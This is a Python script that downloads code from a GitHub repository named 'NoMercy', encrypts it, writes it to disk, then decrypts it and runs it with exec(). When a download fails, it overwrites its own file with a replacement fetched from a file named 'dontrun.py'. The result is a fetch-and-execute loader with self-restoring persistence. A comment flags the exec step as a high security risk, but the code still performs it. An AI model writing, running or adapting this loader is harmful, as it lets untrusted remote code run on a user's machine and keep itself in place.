import requests
import os
from cryptography.fernet import Fernet

# Generate a key for encryption/decryption
key = Fernet.generate_key()
crypto = Fernet(key)

def download_file(url, filename):
    try:
        # Download the file
        response = requests.get(url)
        response.raise_for_status()  # Check if the request was successful
        
        # Encrypt the content
        encrypted_bytes = crypto.encrypt(response.content)
        
        # Save the encrypted content to a file
        with open(filename, "wb") as file:
            file.write(encrypted_bytes)
        
        # Decrypt the content
        decrypted_bytes = crypto.decrypt(encrypted_bytes)
        
        # Execute the decrypted content (WARNING: HIGH SECURITY RISK!)
        exec(decrypted_bytes.decode('utf-8'))
        
        print(f"File downloaded, encrypted, and executed successfully. Saved as {filename}")
        
    except requests.RequestException as e:
        print(f"An error occurred while downloading the file: {e}")
        if os.path.exists(__file__):
            print("Script deleted. Attempting to download a replacement.")
            download_self()  # Attempt to download the script itself
        else:
            print("Script not found.")

def download_self():
    script_url = "https://github.com/soumeswar/NoMercy/blob/main/dontrun.py"  # Replace with the URL of your script
    try:
        # Download the script
        response = requests.get(script_url)
        response.raise_for_status()  # Check if the request was successful
        
        # Save the script to a file
        with open(__file__, "wb") as file:
            file.write(response.content)
        
        print("Replacement script downloaded successfully.")
        
    except requests.RequestException as e:
        print(f"An error occurred while downloading the replacement script: {e}")

# Example usage
download_file("https://github.com/soumeswar/NoMercy/blob/main/unknown.py", "encrypted_file")
